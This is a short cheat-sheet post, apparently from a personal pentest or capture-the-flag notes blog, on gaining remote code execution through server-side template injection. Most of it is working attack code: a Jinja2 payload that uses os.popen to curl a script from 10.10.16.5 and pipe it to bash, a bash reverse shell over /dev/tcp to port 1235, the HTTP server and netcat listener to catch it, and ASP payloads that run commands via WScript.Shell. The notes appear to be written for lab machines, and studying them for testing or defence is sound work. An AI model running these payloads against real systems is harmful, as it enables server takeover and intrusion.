---
description: >-
  RCE via SSTI
title: RCE via SSTI              # Add title here
date: 2023-01-31 08:00:00 -0600                           # Change the date to match completion date
categories: [06 Exploitation, RCE via SSTI]                     # Change Templates to Writeup
tags: [exploitation, azure, rce, ssti]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---
### PYTHON
First we need to inject our payload within the request:
```bash
POST / HTTP/1.1
.
.
costume={{+self._TemplateReference__context.cycler.__init__.__globals__.os.popen('curl+http%3a//10.10.16.5 | bash').read()+}}&q=ad&addr=ad
```
Create a script and name it as index.html:
```bash                                                              
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.16.5/1235 0>&1'
```
Start our python under the same path as index.html to share it:
```bash
sudo python3 -m http.server 80

nc -lvnp 1235
```
Examples:
[Epsilon](https://shuciran.github.io/posts/Epsilon/#fnref:rce-ssti)
### ASP
It is possible to exploit an ASP SSTI with the following payload:
```bash
<%response.write (7*7)%>
```
If the response reflects a "49" then you can use this payload to get RCE:
```bash
<%response.write CreateObject("WScript.Shell").Exec("cmd /c ping -n 1 10.10.14.4").StdOut.Readall()%>
```
Examples:
[[Anubis#^95c992]]